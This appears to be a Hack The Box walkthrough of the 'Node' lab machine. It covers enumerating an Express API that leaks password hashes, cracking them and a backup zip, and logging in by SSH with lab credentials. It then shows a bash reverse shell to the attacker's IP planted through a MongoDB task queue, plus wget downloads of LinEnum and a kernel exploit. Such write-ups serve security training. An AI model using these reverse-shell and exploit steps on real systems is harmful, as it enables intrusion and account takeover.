![logo](/logo.png)

# [Node- BOX]  
Hi folks, today I am going to solve an Medium rated hack the box machine which was released on 14 Oct 2017 machine on HTB,Node created by [rastating](https://app.hackthebox.com/users/3853) .So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *JSON
  *Linux kernel 4.4
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/node 10.10.10.58
```

###### Output 

![](/Linux/Linux-Medium/Node/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/node 10.10.10.58                                                                                            ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-08 10:15 EAT
Nmap scan report for 10.10.10.58
Host is up (0.33s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
| hadoop-tasktracker-info: 
|_  Logs: /login
| hadoop-datanode-info: 
|_  Logs: /login
|_http-title: MyPlace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.05 seconds
```

looking at the results  we find out that there are 2 ports open and its a `Ubuntu`and its running an `Apache Hadoop`. 
port[22]-ssh
port[3000]-Apache Hadoop


so when we go the browser at [http://10.10.10.58:3000](http://10.10.10.58:3000) we find a website MyPlace

![](/Linux/Linux-Medium/Node/Screenshots/myplace.png)

i check the page source to see if there is something of interesting in the code. I can see the different JS files running on the client

![](/Linux/Linux-Medium/Node/Screenshots/sources.png)

[Express](https://expressjs.com/) is a NodeJS-based JavaScript framework for serving websites. The benefits of using JavaScript on the server is that it allows simplified interactions between the client-side JavaScript and the server-side JavaScript.

![](/Linux/Linux-Medium/Node/Screenshots/app.png)

`app.js`  defines the different routes for site, each with a different controller. The controllers are in the `/controllers` folder, and each have references to different calls to paths server-side starting with `/api`. The two endpoints in `admin.js` are `/api/admin/backup` and `/api/session`

![](/Linux/Linux-Medium/Node/Screenshots/adminjs.png)

Both of those endpoints return `{"authenticated":false}` if I try to query them directly. `home.js` referenced `/api/users/latest` (likely getting the users to display in the latest users section). If I check that out with `curl`, it returns an array of users, each with `_id`, `username`, `password`, and `is_admin` fields

![](/Linux/Linux-Medium/Node/Screenshots/home.png)

```sh
curl -s 10.10.10.58:3000/api/users/latest | jq .
```

![](/Linux/Linux-Medium/Node/Screenshots/users.png)

In `profile.js`, there’s a call to `/api/users/' + $routeParams.username`. I can try that, and with known users is returns the same data, and with a non-existent user it returns not found

![](/Linux/Linux-Medium/Node/Screenshots/profile.png)

```sh
curl -s 10.10.10.58:3000/api/users/mark | jq .
```

![](/Linux/Linux-Medium/Node/Screenshots/usersnouser.png)

Eventually I checked `/api/users/`. It returns the same three users, plus one more, `myP14ceAdm1nAcc0uNT`

```sh
curl -s 10.10.10.58:3000/api/users/ | jq .
```

![](/Linux/Linux-Medium/Node/Screenshots/usersall.png)

# Exploitation

Now that we have the password hashes i will use this to extract the passwords hashes only so that we can begin to be able to crack.

```sh
curl -s 10.10.10.58:3000/api/users/ | jq -r '.[].password'
```

![](/Linux/Linux-Medium/Node/Screenshots/hashes.png)

For unsalted hashes with a standard wordlist, it’s just easier to check online sites first rather than cracking myself. I’ll drop the hashes into [CrackStation](https://crackstation.net/), and three of the four have been found

![](/Linux/Linux-Medium/Node/Screenshots/crackstatation.png)

The one I’m most interested in, the admin account  which was `myP14ceAdm1nAcc0uNT and passwd manchester`let go and login

![](/Linux/Linux-Medium/Node/Screenshots/loggedinadmin.png)

so we can only see a single link download so lets download it . once we download the `myplace,backup` we check the file type

```sh
file myplace.backup 
```

![](/Linux/Linux-Medium/Node/Screenshots/backup.png)

The content of the file consists of a continuous sequence of ASCII characters, let’s have a look at some of the content.

```sh
tail -c 500 myplace.backup
```

![](/Linux/Linux-Medium/Node/Screenshots/tail.png)

The character set aligns with the base64 encoding scheme. After decoding, it was revealed that the content represents a Zip Archive.

```sh
cat myplace.backup | base64 -d > myplace
```

![](/Linux/Linux-Medium/Node/Screenshots/base64.png)

Then lets rename the `myplace` to `.zip`

![](/Linux/Linux-Medium/Node/Screenshots/zip.png)

It appears that the archived file, which has been renamed to .zip, contains the source code for the website.

Trying to unzip the archive (now renamed to `.zip`) requires a password:

```sh
unzip myplace.zip
```

![](/Linux/Linux-Medium/Node/Screenshots/uzippasswd.png)

We can use the tool zip2john to extract the hash file from the zip file.

```sh
sudo zip2john myplace.zip > myplacehash.txt
```

![](/Linux/Linux-Medium/Node/Screenshots/zip2john.png)

We will use John to crack it.

```sh
john myplace.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![](/Linux/Linux-Medium/Node/Screenshots/johnpasswd.png)

Upon unzipping the files, we get the source code for the “myplace” application, providing us with an opportunity to carefully check its contents.

![](Linux/Linux-Medium/Node/Screenshots/mark.png)


Within the `app.js` file, there exists a database connection string containing the credentials for the user named `mark: 5AYRft73VtFpc84k`

```sh
ssh mark@10.10.10.58
```


![](Linux/Linux-Medium/Node/Screenshots/ssh.png)

we cannot access the user flag with mark its from tom so we have to enumerate the target to get tom 

so let use LinEmum to check for privsecs

```sh
wget http://10.10.14.15:8000/LinEnum.sh
```

![](/Linux/Linux-Medium/Node/Screenshots/LinEnum.png)

Upon further investigation, we discovered the presence of another process of app.js located at /var/scheduler/app.js.

![](/Linux/Linux-Medium/Node/Screenshots/tomapp.png)

In addition to examining the `app.js` file within the myplace directory, we decided to analyze this newly identified app.js. During our analysis, we uncovered a distinct MongoDB URI associated with a database named `scheduler`, which is different from the previously discovered `myplace` database.

![](/Linux/Linux-Medium/Node/Screenshots/mongodb.png)

The application attempts to retrieve the value of the `cmd` parameter from the `tasks` collection within the `scheduler` database. It then executes this command under the context of the “tom” user and subsequently removes it. As a result, command execution is achieved with the privileges of the “tom” user. Now, our objective is to acquire a shell.

Next, we endeavor to access the “scheduler” database as the “mark” user through the utilization of the `mongo` command below.

```sh
mongo -u mark -p 5AYRft73VtFpc84k scheduler
```


![](/Linux/Linux-Medium/Node/Screenshots/scheduler.png)

We can see the existence of a collection “tasks”. Our next step involves configuring the reverse shell command within the “cmd” value. To accomplish this, we generate a script named “shell.sh” within the /dev/shm directory.

```sh
echo "bash -i >& /dev/tcp/10.10.14.15/1337 0>&1" >>shell.sh
```

then lets return to the mongodb and be able to insert the cmd.

```sh
db.tasks.insert( { cmd:"bash /dev/shm/shell.sh" } );
```

Launch a listener on our attack box and after a second we get a shell

![](/Linux/Linux-Medium/Node/Screenshots/shell.png)

Then we can be able to get the user flag

![](/Linux/Linux-Medium/Node/Screenshots/userflag.png)

# Privillage Escalation

Now, let’s check the system information.

![](/Linux/Linux-Medium/Node/Screenshots/uname.png)

Let’s check searchsploit for information on Linux kernel 4.4.

![](/Linux/Linux-Medium/Node/Screenshots/searchsploit.png)

We find a kernel privilege escalation for this version of the kernel highlighted above. We transfer the exploit to our working directory and subsequently to the target.

![](/Linux/Linux-Medium/Node/Screenshots/seachsploit.png)

```sh
wget http://10.10.14.15:8000/44298.c
```

We compile the exploit using gcc and execute the resulting executable.

```sh
gcc 44298.c -o privsec
```

![](/Linux/Linux-Medium/Node/Screenshots/rootflag.png)

	-------------------------END successful attack @lesley----------------------

